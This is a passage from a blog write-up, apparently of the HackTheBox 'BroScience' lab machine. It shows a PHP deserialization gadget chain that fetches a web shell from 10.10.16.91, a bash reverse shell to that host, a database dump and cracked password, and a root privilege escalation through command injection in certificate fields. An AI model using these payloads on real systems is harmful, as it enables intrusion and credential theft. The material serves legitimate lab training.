    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$theme</span> <span class="o">=</span> <span class="s2">"light"</span><span class="p">)</span> <span class="p">{</span>
		<span class="nv">$this</span><span class="o">-&gt;</span><span class="n">theme</span> <span class="o">=</span> <span class="nv">$theme</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">get_theme</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'user-prefs'</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nv">$up_cookie</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">UserPrefs</span><span class="p">()));</span>
            <span class="nb">setcookie</span><span class="p">(</span><span class="s1">'user-prefs'</span><span class="p">,</span> <span class="nv">$up_cookie</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$up_cookie</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'user-prefs'</span><span class="p">];</span>
        <span class="p">}</span>
        <span class="nv">$up</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$up_cookie</span><span class="p">));</span>
        <span class="k">return</span> <span class="nv">$up</span><span class="o">-&gt;</span><span class="n">theme</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s2">"light"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">get_theme_class</span><span class="p">(</span><span class="nv">$theme</span> <span class="o">=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$theme</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$theme</span> <span class="o">=</span> <span class="nf">get_theme</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">strcmp</span><span class="p">(</span><span class="nv">$theme</span><span class="p">,</span> <span class="s2">"light"</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s2">"uk-light"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">return</span> <span class="s2">"uk-dark"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">function</span> <span class="n">set_theme</span><span class="p">(</span><span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nb">setcookie</span><span class="p">(</span><span class="s1">'user-prefs'</span><span class="p">,</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nc">UserPrefs</span><span class="p">(</span><span class="nv">$val</span><span class="p">))));</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">Avatar</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$imgPath</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$imgPath</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span> <span class="o">=</span> <span class="nv">$imgPath</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">save</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$f</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">);</span>
        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">));</span>
        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">AvatarInterface</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$tmp</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$imgPath</span><span class="p">;</span> 

    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Avatar</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span><span class="p">);</span>
        <span class="nv">$a</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">tmp</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>Codebase above is vulnerable to PHP deserialization / PHP Object exploitation. I suggest following <a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">article</a> and IppSec’s <a href="https://www.youtube.com/watch?v=HaW15aMzBUM">video</a></p><p>If we reach initialize <code class="language-plaintext highlighter-rouge">Avatar</code>, we can write files through <code class="language-plaintext highlighter-rouge">file_get_contents</code>.</p><p>This is code that i’ve used to serialize payload:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>

<span class="kd">class</span> <span class="nc">UserPrefs</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$theme</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$theme</span> <span class="o">=</span> <span class="s2">"light"</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">theme</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">AvatarInterface</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">Avatar</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$imgPath</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__construct</span><span class="p">(</span><span class="nv">$imgPath</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span> <span class="o">=</span> <span class="nv">$imgPath</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">save</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$f</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">);</span>
        <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">));</span>
        <span class="nb">fclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">class</span> <span class="nc">AvatarInterface</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">"http://10.10.16.91/cmd.php"</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$imgPath</span> <span class="o">=</span> <span class="s2">"cmd.php"</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="n">__wakeup</span><span class="p">()</span> <span class="p">{</span>
        <span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Avatar</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">imgPath</span><span class="p">);</span>
        <span class="nv">$a</span><span class="o">-&gt;</span><span class="nf">save</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="n">tmp</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">UserPrefs</span><span class="p">();</span>

<span class="k">echo</span> <span class="s2">"Serialized payload: "</span><span class="mf">.</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s2">"Serialized payload and base64 encoded: "</span><span class="mf">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$obj</span><span class="p">));</span>
<span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>After being logged in we can simply change <code class="language-plaintext highlighter-rouge">user-prefs</code> with payload that was generated.</p><p><img data-src="/assets/images/d09473acf14cebf60604390bc31e01b3c8775de468373e39e8e3eee945fda72e.png" alt="picture 9" data-proofer-ignore></p><p>If everything has been done right, our <code class="language-plaintext highlighter-rouge">cmd.php</code> should have been uploaded!</p><p>Looks good:</p><p><img data-src="/assets/images/5c620ab08f7ea2b7bc7fad95a3b22478ab8028e449263e682465ddcee7398be2.png" alt="picture 10" data-proofer-ignore></p><p>I used following TCP reverse shell for bash, i’ve just fully URL encoded:</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/10.10.16.91/4444 0&gt;&amp;1"</span>
</pre></table></code></div></div><p>Shell should pop:</p><p><img data-src="/assets/images/c723bb806b659de8ee63702c3532739a205bda5e30857ad4d2cf2af2016d3fa1.png" alt="picture 11" data-proofer-ignore></p><h1 id="privilege-escalation-to-bill-from-www-data">Privilege escalation to bill from www-data</h1><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>psql -h 127.0.0.1 -U dbuser -d broscience -W -c "select * from users;"
</pre></table></code></div></div><p><img data-src="/assets/images/aa8ec41d26ef9c37e711668f2e7aad69da7636a6d5ff4074afc863025dbdceeb.png" alt="picture 12" data-proofer-ignore></p><p>We can decode Bill’s password, just remember to add Salt!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym    
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 20 (md5($salt.$pass))
Hash.Target......: 13edad4932da9dbb57d9cd15b66ed104:NaCl
</pre></table></code></div></div><p>We can login via SSH as <code class="language-plaintext highlighter-rouge">bill</code>.</p><h1 id="privilege-escalation-to-root">Privilege Escalation to root</h1><p>I’ve ran <code class="language-plaintext highlighter-rouge">linpeas</code> as usual for quick wins and any out-of-ordinary findings and it showed:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  2 root root 4096 Jul 14 16:06 .
drwxr-xr-x 19 root root 4096 Jan  2 04:50 ..
-rwxr-xr-x  1 root root 1806 Jul 14 16:05 renew_cert.sh  
</pre></table></code></div></div><p>When running <code class="language-plaintext highlighter-rouge">pspy64</code> we can see that script is being called by <code class="language-plaintext highlighter-rouge">root</code>. (<code class="language-plaintext highlighter-rouge">pspy64 -r /tmp -r /opt -r /home -pf -i 1000</code>)</p><p><img data-src="/assets/images/af8c0b7c068aedd5c62128d310a6565f841924ec2c356b71bce2c2d547434940.png" alt="picture 13" data-proofer-ignore></p><p>This is <code class="language-plaintext highlighter-rouge">/opt/renew.sh</code> that’s being ran.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-ne</span> 1 <span class="o">]</span> <span class="o">||</span> <span class="o">[</span> <span class="nv">$1</span> <span class="o">==</span> <span class="s2">"-h"</span> <span class="o">]</span> <span class="o">||</span> <span class="o">[</span> <span class="nv">$1</span> <span class="o">==</span> <span class="s2">"--help"</span> <span class="o">]</span> <span class="o">||</span> <span class="o">[</span> <span class="nv">$1</span> <span class="o">==</span> <span class="s2">"help"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> certificate.crt"</span><span class="p">;</span>
    <span class="nb">exit </span>0<span class="p">;</span>
<span class="k">fi

if</span> <span class="o">[</span> <span class="nt">-f</span> <span class="nv">$1</span> <span class="o">]</span><span class="p">;</span> <span class="k">then

    </span>openssl x509 <span class="nt">-in</span> <span class="nv">$1</span> <span class="nt">-noout</span> <span class="nt">-checkend</span> 86400 <span class="o">&gt;</span> /dev/null

    <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"No need to renew yet."</span><span class="p">;</span>
        <span class="nb">exit </span>1<span class="p">;</span>
    <span class="k">fi

    </span><span class="nv">subject</span><span class="o">=</span><span class="si">$(</span>openssl x509 <span class="nt">-in</span> <span class="nv">$1</span> <span class="nt">-noout</span> <span class="nt">-subject</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">"="</span> <span class="nt">-f2-</span><span class="si">)</span>

    <span class="nv">country</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'C = .{2}'</span><span class="si">)</span>
    <span class="nv">state</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'ST = .*,'</span><span class="si">)</span>
    <span class="nv">locality</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'L = .*,'</span><span class="si">)</span>
    <span class="nv">organization</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'O = .*,'</span><span class="si">)</span>
    <span class="nv">organizationUnit</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'OU = .*,'</span><span class="si">)</span>
    <span class="nv">commonName</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$subject</span> | <span class="nb">grep</span> <span class="nt">-Eo</span> <span class="s1">'CN = .*,?'</span><span class="si">)</span>
    <span class="nv">emailAddress</span><span class="o">=</span><span class="si">$(</span>openssl x509 <span class="nt">-in</span> <span class="nv">$1</span> <span class="nt">-noout</span> <span class="nt">-email</span><span class="si">)</span>

    <span class="nv">country</span><span class="o">=</span><span class="k">${</span><span class="nv">country</span>:4<span class="k">}</span>
    <span class="nv">state</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">state</span>:5<span class="k">}</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="si">)</span>
    <span class="nv">locality</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">locality</span>:3<span class="k">}</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="si">)</span>
    <span class="nv">organization</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">organization</span>:4<span class="k">}</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="si">)</span>
    <span class="nv">organizationUnit</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">organizationUnit</span>:5<span class="k">}</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="si">)</span>
    <span class="nv">commonName</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="k">${</span><span class="nv">commonName</span>:5<span class="k">}</span> | <span class="nb">awk</span> <span class="nt">-F</span>, <span class="s1">'{print $1}'</span><span class="si">)</span>

    <span class="nb">echo</span> <span class="nv">$subject</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">""</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"Country     =&gt; </span><span class="nv">$country</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"State       =&gt; </span><span class="nv">$state</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"Locality    =&gt; </span><span class="nv">$locality</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"Org Name    =&gt; </span><span class="nv">$organization</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"Org Unit    =&gt; </span><span class="nv">$organizationUnit</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"Common Name =&gt; </span><span class="nv">$commonName</span><span class="s2">"</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"Email       =&gt; </span><span class="nv">$emailAddress</span><span class="s2">"</span><span class="p">;</span>

    <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Generating certificate..."</span><span class="p">;</span>
    openssl req <span class="nt">-x509</span> <span class="nt">-sha256</span> <span class="nt">-nodes</span> <span class="nt">-newkey</span> rsa:4096 <span class="nt">-keyout</span> /tmp/temp.key <span class="nt">-out</span> /tmp/temp.crt <span class="nt">-days</span> 365 <span class="o">&lt;&lt;&lt;</span><span class="s2">"</span><span class="nv">$country</span><span class="s2">
    </span><span class="nv">$state</span><span class="s2">
    </span><span class="nv">$locality</span><span class="s2">
    </span><span class="nv">$organization</span><span class="s2">
    </span><span class="nv">$organizationUnit</span><span class="s2">
    </span><span class="nv">$commonName</span><span class="s2">
    </span><span class="nv">$emailAddress</span><span class="s2">
    "</span> 2&gt;/dev/null

    /bin/bash <span class="nt">-c</span> <span class="s2">"mv /tmp/temp.crt /home/bill/Certs/</span><span class="nv">$commonName</span><span class="s2">.crt"</span>
<span class="k">else
    </span><span class="nb">echo</span> <span class="s2">"File doesn't exist"</span>
    <span class="nb">exit </span>1<span class="p">;</span>

</pre></table></code></div></div><p>The problem above is that we can run subcommands if we insert them into certificate subject values:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt -days 1
</pre></table></code></div></div><p><img data-src="/assets/images/bccf7294d444eb15e31a38aab5bcc16a6ce48f6c6552b82f4809b3f9c1e2d0f5.png" alt="picture 16" data-proofer-ignore></p><p>We can check if our calues have been inserted into the certificate</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>openssl x509 -in broscience.crt -noout -text
</pre></table></code></div></div><p><img data-src="/assets/images/e8fb976668ac26fd5780819b07dc2692ad4e6935db835a603684ee2aff3f37ff.png" alt="picture 15" data-proofer-ignore></p><p>Shell should pop in the next 2 minutes as root!</p><p><img data-src="/assets/images/7050f113e9793382ef1dd984d0d71b7d5054a8c0d55e7864e7090e1fb0671f5e.png" alt="picture 14" data-proofer-ignore></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/linux/'>Linux</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web/" class="post-tag no-text-decoration" >Web</a> <a href="/tags/local-file-inclusion/" class="post-tag no-text-decoration" >Local File Inclusion</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >SSH</a> <a href="/tags/openssl/" class="post-tag no-text-decoration" >openssl</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(HTB) - BroScience - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/Broscience/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(HTB) - BroScience - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/Broscience/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(HTB) - BroScience - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/Broscience/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/forgot/"><div class="card-body"> <em class="timeago small" date="2023-03-03 09:33:00 +0100" >Mar 3</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(HTB) - Forgot</h3><div class="text-muted small"><p> Forgot is an intermediate box which start with few basic web application misconfigurations. Box runs vulnerable tensorflow python package in a script which is run as sudo/root Enumeration NMAP Nma...</p></div></div></a></div><div class="card"> <a href="/posts/photobomb/"><div class="card-body"> <em class="timeago small" date="2023-03-04 09:33:00 +0100" >Mar 4</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(HTB) - Photobomb</h3><div class="text-muted small"><p> Photobomb is an easy linux box where we have to enumerate a web application, achieving OS command injection. For privilege escalation, there is vulnerable script which uses relative path which we c...</p></div></div></a></div><div class="card"> <a href="/posts/awkward/"><div class="card-body"> <em class="timeago small" date="2023-03-04 10:33:00 +0100" >Mar 4</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(HTB) - Awkward</h3><div class="text-muted small"><p> Enumeration NMAP Nmap scan report for 10.129.45.168 Host is up (0.045s latency). Not shown: 65514 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh Ope...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/DOM-XSS/" class="btn btn-outline-primary" prompt="Older"><p>(Portswigger/WebAcademy) - DOM-Based Cross-Site Scripting (XSS)</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() 